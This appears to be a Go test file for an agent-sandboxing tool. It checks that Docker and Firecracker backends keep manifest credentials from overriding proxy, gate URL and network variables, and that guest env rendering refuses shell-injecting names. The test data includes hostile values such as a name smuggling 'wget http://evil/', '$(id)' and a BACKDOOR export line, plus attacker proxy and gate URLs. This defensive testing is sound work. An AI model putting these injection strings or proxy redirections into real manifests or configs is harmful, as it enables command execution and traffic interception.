package sandbox

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/constle/constle/pkg/manifest"
)

// The per-run values a manifest must never be able to supply. A gate URL
// carries this run's gate token and is the agent's only route to the gate; the
// proxy address is its only route to the network.
const (
	mintedGateURL   = "http://172.30.0.1:7801/minted-gate-token"
	attackerGateURL = "http://attacker.example/not-the-gate"
	operatorProxy   = "http://operator-proxy:8080"
)

// TestGuestEnvInfraSurvivesACollidingCredential is the regression guard for the
// merge-order finding on the Firecracker path.
//
// buildWorkspaceImage used to merge the forwarded host variables OVER the proxy
// and guest-network block. That was harmless only because the forwarded names
// were a hardcoded list of three; once the names come from the Agentfile, the
// old order let a manifest hand its own guest a proxy address and misstate its
// own network to it.
//
// The gate URL is asserted here too, though the old order did not expose it —
// gateEnv was applied last then as well. It is in this test so that a future
// reshuffle of the sequence cannot quietly take away the half that was already
// right.
//
// The composition is driven directly with a credential map claiming each of
// those names, which is the state the merge order has to survive:
// manifest.Validate and credentials.Resolve both refuse these names, so this is
// asking what holds when neither has run.
func TestGuestEnvInfraSurvivesACollidingCredential(t *testing.T) {
	credEnv := map[string]string{
		"GROQ_API_KEY":       "gsk-legitimate",
		"HTTP_PROXY":         operatorProxy,
		"HTTPS_PROXY":        operatorProxy,
		"http_proxy":         operatorProxy,
		"https_proxy":        operatorProxy,
		"NO_PROXY":           "*",
		"CONSTLE_GUEST_CIDR": "10.0.0.0/8",
		"CONSTLE_GATEWAY_IP": "10.0.0.1",
		"CONSTLE_A2A_URL":    attackerGateURL,
	}
	gateEnv := map[string]string{
		"CONSTLE_A2A_URL": mintedGateURL,
		"NO_PROXY":        "172.30.0.1",
		"no_proxy":        "172.30.0.1",
	}

	env := guestEnv("172.30.0.1", "172.30.0.2", credEnv, gateEnv)

	wantProxy := "http://172.30.0.1:3128"
	for _, name := range []string{"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"} {
		if env[name] != wantProxy {
			t.Errorf("%s = %q, want the run's own Squid address %q — a credential replaced the guest's route to the network",
				name, env[name], wantProxy)
		}
	}
	if env["CONSTLE_A2A_URL"] != mintedGateURL {
		t.Errorf("CONSTLE_A2A_URL = %q, want the minted gate URL %q — a credential redirected the agent's signed traffic",
			env["CONSTLE_A2A_URL"], mintedGateURL)
	}
	if env["NO_PROXY"] != "172.30.0.1" {
		t.Errorf("NO_PROXY = %q, want the gate address — a credential widened the proxy exemption", env["NO_PROXY"])
	}
	if env["CONSTLE_GUEST_CIDR"] != "172.30.0.2/30" {
		t.Errorf("CONSTLE_GUEST_CIDR = %q, want the run's own value", env["CONSTLE_GUEST_CIDR"])
	}
	if env["CONSTLE_GATEWAY_IP"] != "172.30.0.1" {
		t.Errorf("CONSTLE_GATEWAY_IP = %q, want the run's own value", env["CONSTLE_GATEWAY_IP"])
	}

	// The legitimate credential must still arrive: an order that protected the
	// infrastructure by dropping the credentials would pass every assertion
	// above and deliver an agent with no key.
	if env["GROQ_API_KEY"] != "gsk-legitimate" {
		t.Errorf("GROQ_API_KEY = %q, want the declared credential's value", env["GROQ_API_KEY"])
	}
}

// TestGuestEnvSetsEveryReservedProxyNameWithNoGateBound closes the gap an
// independent review found in the structural guard: a name that is reserved in
// the validator but never WRITTEN by a backend leaves the composition ordering
// with nothing to overwrite, so the second, validation-independent guard does
// not exist for it.
//
// That was the state of NO_PROXY on a run with no gate bound — the only
// NO_PROXY this backend set came from gateEnv — and of ALL_PROXY and FTP_PROXY
// on every run. A credential of those names survived into the guest.
//
// gateEnv is empty here, which is exactly the no-gate run.
func TestGuestEnvSetsEveryReservedProxyNameWithNoGateBound(t *testing.T) {
	credEnv := map[string]string{
		"NO_PROXY":   "*",
		"no_proxy":   "*",
		"ALL_PROXY":  "socks5://attacker:1080",
		"all_proxy":  "socks5://attacker:1080",
		"FTP_PROXY":  "http://attacker:2121",
		"ftp_proxy":  "http://attacker:2121",
		"HTTP_PROXY": operatorProxy,
	}

	env := guestEnv("172.30.0.1", "172.30.0.2", credEnv, map[string]string{})

	wantProxy := "http://172.30.0.1:3128"
	for name, want := range map[string]string{
		// Empty, not the credential's "*": with no gate bound nothing is
		// exempt from the proxy.
		"NO_PROXY": "", "no_proxy": "",
		"ALL_PROXY": wantProxy, "all_proxy": wantProxy,
		"FTP_PROXY": wantProxy, "ftp_proxy": wantProxy,
		"HTTP_PROXY": wantProxy,
	} {
		if env[name] != want {
			t.Errorf("%s = %q, want %q — a credential of a reserved name survived into the guest",
				name, env[name], want)
		}
	}
}

// TestGuestEnvGateExemptionStillWins pins the other half: the empty NO_PROXY
// above is a default, not a ceiling. When a gate IS bound, its address is the
// one exemption this backend has, and gateEnv must still overwrite the default.
func TestGuestEnvGateExemptionStillWins(t *testing.T) {
	env := guestEnv("172.30.0.1", "172.30.0.2",
		map[string]string{"NO_PROXY": "*"},
		map[string]string{"NO_PROXY": "172.30.0.1", "no_proxy": "172.30.0.1"})

	for _, name := range []string{"NO_PROXY", "no_proxy"} {
		if env[name] != "172.30.0.1" {
			t.Errorf("%s = %q, want the gate address — the guest would detour gate traffic through Squid",
				name, env[name])
		}
	}
}

// TestRenderGuestEnvFileRefusesUnrenderableNames is the regression guard for the
// injection finding on the Firecracker path.
//
// The guest env file is a shell script the guest sources as root before the
// agent runs, written as `export NAME='value'`. The value is single-quote
// escaped; the name cannot be, because a quoted name is not an assignment. So a
// name carrying a quote, a semicolon or a newline closes the statement and opens
// another one — arbitrary shell, in the guest, from a manifest field.
//
// The renderer refuses rather than escapes, and this asserts the refusal AND
// that nothing was rendered: a function that returned both an error and a
// half-written file would leave a caller that ignored the error writing the
// injection to disk.
func TestRenderGuestEnvFileRefusesUnrenderableNames(t *testing.T) {
	for _, name := range []string{
		`KEY'; wget http://evil/ #`,
		"KEY\nexport BACKDOOR=1",
		"KEY; id",
		"KEY=inline",
		"KEY OTHER",
		"KEY$(id)",
		"",
	} {
		t.Run(name, func(t *testing.T) {
			out, err := renderGuestEnvFile(map[string]string{name: "value"})
			if err == nil {
				t.Fatalf("rendered a guest env file for variable name %q:\n%s", name, out)
			}
			if out != "" {
				t.Errorf("returned an error AND %d bytes of output; a caller that ignored the error would write the injection to disk:\n%s", len(out), out)
			}
		})
	}
}

// TestRenderGuestEnvFileQuotesValues guards the half that was already right:
// a value carrying a single quote must not break out of its own quoting. Not a
// regression test — it pins a deliberate non-change, so it passes against the
// pre-fix renderer too.
func TestRenderGuestEnvFileQuotesValues(t *testing.T) {
	out, err := renderGuestEnvFile(map[string]string{"KEY": `a'; id; b`})
	if err != nil {
		t.Fatalf("renderGuestEnvFile: %v", err)
	}
	if want := `export KEY='a'\''; id; b'` + "\n"; out != want {
		t.Errorf("rendered %q, want %q", out, want)
	}
}

// TestRenderGuestEnvFileIsDeterministic: the file used to be rendered by ranging
// over a map, so the same environment produced different bytes on every run.
// Nothing depended on it, which is exactly why it is worth pinning now that the
// contents are manifest-driven and reviewable.
func TestRenderGuestEnvFileIsDeterministic(t *testing.T) {
	env := map[string]string{"ZULU": "z", "ALPHA": "a", "MIKE": "m", "KILO": "k"}
	first, err := renderGuestEnvFile(env)
	if err != nil {
		t.Fatalf("renderGuestEnvFile: %v", err)
	}
	for i := 0; i < 50; i++ {
		again, err := renderGuestEnvFile(env)
		if err != nil {
			t.Fatalf("renderGuestEnvFile: %v", err)
		}
		if again != first {
			t.Fatalf("two renders of one environment differ:\n%q\n%q", first, again)
		}
	}
	if !strings.HasPrefix(first, "export ALPHA=") {
		t.Errorf("render does not start with the lowest-sorting name:\n%s", first)
	}
}

// TestAgentContainerEnvGateURLSurvivesACollidingCredential is the Docker half of
// the merge-order guard: the gate URL minted for this run must win over a
// credential claiming the same name.
func TestAgentContainerEnvGateURLSurvivesACollidingCredential(t *testing.T) {
	env := agentContainerEnv(
		map[string]string{"GROQ_API_KEY": "gsk-legitimate", "CONSTLE_A2A_URL": attackerGateURL},
		map[string]string{"CONSTLE_A2A_URL": mintedGateURL},
	)
	if env["CONSTLE_A2A_URL"] != mintedGateURL {
		t.Errorf("CONSTLE_A2A_URL = %q, want the minted gate URL %q", env["CONSTLE_A2A_URL"], mintedGateURL)
	}
	if env["GROQ_API_KEY"] != "gsk-legitimate" {
		t.Errorf("GROQ_API_KEY = %q, want the declared credential's value", env["GROQ_API_KEY"])
	}
}

// TestAgentRunArgsProxyValueSurvivesACollidingCredential is the Docker path's
// own hole, and it is NOT covered by the merge order: the four proxy variables
// are written into the argv by agentRunArgs, not into the environment map, so a
// credential named HTTP_PROXY would produce a second `-e HTTP_PROXY` entry and
// leave which value the container gets to docker's argument handling.
//
// The one that must survive is the address this run built. The sandbox has no
// route off its internal network except through that proxy, so a container
// pointed anywhere else reaches nothing — and if it could reach the operator's
// own proxy, it would be egressing outside the allowlist.
func TestAgentRunArgsProxyValueSurvivesACollidingCredential(t *testing.T) {
	env := map[string]string{
		"GROQ_API_KEY": "gsk-legitimate",
		"HTTP_PROXY":   operatorProxy,
		"HTTPS_PROXY":  operatorProxy,
		"http_proxy":   operatorProxy,
		"https_proxy":  operatorProxy,
	}
	args := agentRunArgs("constle-agent-deadbeef", "constle-int-deadbeef",
		"alpine:latest", 0, []string{"sh", "-c", "id"}, nil, env)

	joined := strings.Join(args, "\x00")
	if strings.Contains(joined, operatorProxy) {
		t.Errorf("the operator's proxy address reached the argv; the container's egress path is manifest-controlled\nargv: %v", args)
	}
	for _, name := range []string{"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"} {
		if !hasOptionArg(args, "-e", name+"="+dockerProxyURL) {
			t.Errorf("%s no longer carries the run's Squid address inline\nargv: %v", name, args)
		}
		// Exactly one entry for the name: a name-only `-e HTTP_PROXY` alongside
		// the inline one would resolve from the client's environment.
		if got := countOptionArgsWithPrefix(args, "-e", name); got != 1 {
			t.Errorf("%s appears in %d -e entries, want exactly 1 — which value the container gets is then docker's decision, not ours\nargv: %v", name, got, args)
		}
	}
	// The legitimate credential still has to reach the container, by name.
	if !hasOptionArg(args, "-e", "GROQ_API_KEY") {
		t.Errorf("GROQ_API_KEY is not passed to the container\nargv: %v", args)
	}
}

// TestAgentRunArgsSetsEveryProxyVariable is the regression guard for the
// docker-config injection: the CLI adds proxy variables to every container from
// the `proxies` block of ~/.docker/config.json — httpProxy, httpsProxy, noProxy
// and allProxy — whether or not constle asked for them. An explicit -e wins over
// that, so the four constle already set were safe; NO_PROXY and ALL_PROXY were
// not set at all, and the operator's values arrived in the sandbox unasked.
//
// This is the unit half: every name is present with constle's own value. The
// daemon half is TestAgentContainerGetsNoProxyConfigFromTheOperator below.
func TestAgentRunArgsSetsEveryProxyVariable(t *testing.T) {
	args := agentRunArgs("a", "n", "img", 0, []string{"sh"}, nil, nil)

	for _, want := range []string{
		"HTTP_PROXY=" + dockerProxyURL,
		"HTTPS_PROXY=" + dockerProxyURL,
		"http_proxy=" + dockerProxyURL,
		"https_proxy=" + dockerProxyURL,
		// Squid rather than blank, so a client that prefers ALL_PROXY still
		// traverses the chokepoint instead of losing its proxy entirely.
		"ALL_PROXY=" + dockerProxyURL,
		"all_proxy=" + dockerProxyURL,
		"FTP_PROXY=" + dockerProxyURL,
		"ftp_proxy=" + dockerProxyURL,
		// Empty on purpose: nothing is exempt, because nothing but Squid is
		// reachable from the internal network.
		"NO_PROXY=",
		"no_proxy=",
	} {
		if !hasOptionArg(args, "-e", want) {
			t.Errorf("argv does not set %q, so the docker CLI's own value from ~/.docker/config.json survives into the sandbox\nargv: %v", want, args)
		}
	}
}

// TestAgentContainerGetsNoProxyConfigFromTheOperator proves the same thing
// against a real daemon, which is the only place the injection actually happens:
// asserting on the argv alone cannot show that the CLI would otherwise have
// added something.
//
// It configures a proxies block the way a corporate host does, starts a
// container through the production command, and requires that none of the
// operator's values appear inside it. Those values are the operator's internal
// hostnames — handing them to an untrusted agent is reconnaissance delivered by
// the sandbox that exists to contain it.
func TestAgentContainerGetsNoProxyConfigFromTheOperator(t *testing.T) {
	if !dockerAvailable() {
		t.Skip("Docker not available")
	}

	// Userinfo in every URL on purpose: the docker CLI copies these values
	// verbatim, so a proxy configured as http://user:password@host delivers the
	// operator's proxy CREDENTIALS into the sandbox — not merely the hostnames.
	const (
		operatorSecret  = "cfgpass"
		operatorHTTP    = "http://cfguser:" + operatorSecret + "@operator-http:8080"
		operatorFTP     = "http://cfguser:" + operatorSecret + "@operator-ftp:2121"
		operatorAll     = "socks5://cfguser:" + operatorSecret + "@operator-all:1080"
		operatorNoProxy = "169.254.169.254,internal.corp"
	)
	cfgDir := t.TempDir()
	cfg := `{"proxies":{"default":{` +
		`"httpProxy":"` + operatorHTTP + `",` +
		`"httpsProxy":"` + operatorHTTP + `",` +
		`"ftpProxy":"` + operatorFTP + `",` +
		`"noProxy":"` + operatorNoProxy + `",` +
		`"allProxy":"` + operatorAll + `"}}}`
	if err := os.WriteFile(filepath.Join(cfgDir, "config.json"), []byte(cfg), 0600); err != nil {
		t.Fatal(err)
	}

	cmd := agentRunCommand("unused", "none", "alpine:latest", 0,
		[]string{"sh", "-c", "env"}, nil, map[string]string{})

	// `docker run --rm` without -d, so the output is the container's and nothing
	// survives the test. Everything else is what production builds.
	args := cmd.Args[1:]
	if args[0] != "run" || args[1] != "-d" {
		t.Fatalf("argv does not begin with \"run\" \"-d\": %v", args)
	}
	run := append([]string{"run", "--rm"}, args[2:]...)
	run = removeOptionArg(run, "--name", "unused")

	probe := exec.Command("docker", run...)
	probe.Env = append(cmd.Env, "DOCKER_CONFIG="+cfgDir)

	var clientErr bytes.Buffer
	probe.Stderr = &clientErr
	out, err := probe.Output()
	if err != nil {
		t.Fatalf("docker run: %v\n%s", err, clientErr.Bytes())
	}

	for _, leaked := range []string{operatorSecret, operatorHTTP, operatorFTP, operatorNoProxy, operatorAll} {
		if strings.Contains(string(out), leaked) {
			t.Errorf("the operator's Docker proxy configuration %q reached the sandbox\ncontainer env:\n%s", leaked, out)
		}
	}
	// And constle's own values are the ones that arrived.
	if !strings.Contains(string(out), "HTTP_PROXY="+dockerProxyURL) {
		t.Errorf("the container's HTTP_PROXY is not the run's Squid address\ncontainer env:\n%s", out)
	}
}

// TestAgentEnvForCommandProxyIsNotOverwritten covers the same collision in the
// docker CLIENT's environment, which is a separate surface: the client honours
// HTTP_PROXY when DOCKER_HOST names a remote daemon, so a forwarded value there
// would change how constle reaches Docker.
func TestAgentEnvForCommandProxyIsNotOverwritten(t *testing.T) {
	t.Setenv("HTTP_PROXY", "http://inherited-operator-proxy:3128")

	env := agentEnvForCommand(map[string]string{
		"HTTP_PROXY":   operatorProxy,
		"GROQ_API_KEY": "gsk-legitimate",
	})

	count, got := envValueOnce(env, "HTTP_PROXY")
	if count != 1 {
		t.Errorf("HTTP_PROXY appears %d times in the docker client environment, want exactly 1", count)
	}
	if got == operatorProxy {
		t.Errorf("a forwarded HTTP_PROXY replaced the client's own; how constle reaches the Docker daemon is manifest-controlled")
	}
	if _, v := envValueOnce(env, "GROQ_API_KEY"); v != "gsk-legitimate" {
		t.Errorf("GROQ_API_KEY = %q in the docker client environment, want the credential's value", v)
	}
}

// countOptionArgsWithPrefix counts the "-e" entries whose operand is name or
// name=<anything>, so an inline and a name-only entry for one variable are
// counted together.
func countOptionArgsWithPrefix(args []string, flag, name string) int {
	n := 0
	for i := 0; i < len(args)-1; i++ {
		if args[i] != flag {
			continue
		}
		operand := args[i+1]
		if operand == name || strings.HasPrefix(operand, name+"=") {
			n++
		}
	}
	return n
}

// TestReservedProxyNamesAndWrittenProxyNamesAgree is the invariant that makes
// "three independent guards" true rather than asserted, and neither package can
// check it alone.
//
// pkg/manifest refuses a set of names; the backends write a set of names. The two
// must be equal, in both directions:
//
//   - A name REFUSED but never WRITTEN has no structural guard. The validator is
//     then the only thing between a manifest and its own sandbox's egress path,
//     and the spec's claim that the composition ordering denies the overwrite
//     "even for a manifest that never went through validation" is false for it.
//     That is exactly what an independent review found for ALL_PROXY, FTP_PROXY,
//     and for NO_PROXY on a Firecracker run with no gate bound.
//   - A name WRITTEN but never REFUSED can be declared as a credential. It
//     validates, the backend overrides it during composition, and the operator's
//     variable disappears with no error anywhere.
//
// Both backends are checked, because they compose their environments separately
// and a name can easily be added to one.
func TestReservedProxyNamesAndWrittenProxyNamesAgree(t *testing.T) {
	// What Firecracker writes, on the run with the least of it: no credentials,
	// no gate bound. Anything conditional is therefore absent, which is the
	// stricter direction for the "reserved but never written" half.
	firecrackerWrites := guestEnv("172.30.0.1", "172.30.0.2", nil, nil)

	dockerWrites := map[string]bool{}
	for _, proxy := range dockerProxyEnv {
		dockerWrites[strings.ToUpper(proxy.name)] = true
	}

	// Direction 1: every reserved proxy name is written by both backends.
	for _, reserved := range manifest.ReservedCredentialNames() {
		if !dockerWrites[strings.ToUpper(reserved)] {
			t.Errorf("%s is reserved but the Docker backend never writes it — a credential of that "+
				"name has no guard but the validator", reserved)
		}
		if _, ok := firecrackerWrites[reserved]; !ok {
			t.Errorf("%s is reserved but the Firecracker backend does not write it on a run with no "+
				"gate bound — a credential of that name survives into the guest", reserved)
		}
	}

	// Direction 2: every proxy name a backend writes is reserved. CONSTLE_* is
	// reserved by prefix and is not part of this comparison.
	for _, proxy := range dockerProxyEnv {
		if !manifest.ReservedCredentialName(proxy.name) {
			t.Errorf("the Docker backend writes %s but a credential may declare it; the backend would "+
				"then override the operator's value with no error", proxy.name)
		}
	}
	for name := range firecrackerWrites {
		if strings.HasPrefix(name, "CONSTLE_") {
			continue
		}
		if !manifest.ReservedCredentialName(name) {
			t.Errorf("the Firecracker backend writes %s but a credential may declare it; the backend "+
				"would then override the operator's value with no error", name)
		}
	}
}

// TestDockerStartRefusesAnUnresolvableCredential closes the call-site gap an
// independent review found: every assertion about fail-closed resolution lived
// inside internal/agentenv, so deleting the backend's call to it left the suite
// green. The promise is not "Resolve refuses" — it is "the RUN refuses, before
// any sandbox resource exists", and that is a property of Start.
//
// No daemon is needed, and that is the point rather than a convenience:
// agentenv.Resolve sits above every docker invocation in Start, so if this test
// ever needs a daemon, the resolution has moved below something that creates
// state.
func TestDockerStartRefusesAnUnresolvableCredential(t *testing.T) {
	m := &manifest.AgentManifest{}
	m.Sandbox.Image = "alpine:latest"
	m.Credentials = []manifest.Credential{{Name: "TEST_START_MISSING_KEY"}}

	_, err := (&DockerBackend{}).Start(m)
	if err == nil {
		t.Fatal("Start succeeded with a credential the host cannot supply")
	}
	if !strings.Contains(err.Error(), "TEST_START_MISSING_KEY") {
		t.Errorf("Start failed for some other reason, so this asserts nothing about credentials: %v", err)
	}

	// Nothing may have been created. A leaked network or proxy container would
	// mean the refusal happened after resource creation, which is the half of
	// the promise the error message cannot show.
	for _, kind := range []string{"network", "container"} {
		out, lsErr := exec.Command("docker", kind, "ls", "--format", "{{.Name}}").Output()
		if lsErr != nil {
			continue // no daemon here; the error assertion above still held
		}
		for _, line := range strings.Split(string(out), "\n") {
			if strings.HasPrefix(line, "constle-") && strings.Contains(line, "TEST_START") {
				t.Errorf("Start left a %s behind after refusing: %s", kind, line)
			}
		}
	}
}

// TestFirecrackerStartRefusesAnUnresolvableCredential is the same call-site
// assertion for the other backend. It needs root, because that backend checks
// for root before anything else — deliberately, since a non-root run cannot
// build a microVM at all and saying so first is the more useful error.
//
// So on an unprivileged runner this skips, and the Firecracker call site is
// covered only where the rest of that backend's privileged tests run. Stated
// plainly rather than papered over with a reordering that would exist only to
// make a test pass.
func TestFirecrackerStartRefusesAnUnresolvableCredential(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("the firecracker backend checks for root before resolving credentials")
	}

	m := &manifest.AgentManifest{}
	m.Credentials = []manifest.Credential{{Name: "TEST_START_MISSING_KEY"}}

	_, err := (&FirecrackerBackend{}).Start(m)
	if err == nil {
		t.Fatal("Start succeeded with a credential the host cannot supply")
	}
	if !strings.Contains(err.Error(), "TEST_START_MISSING_KEY") {
		t.Errorf("Start failed for some other reason, so this asserts nothing about credentials: %v", err)
	}
}
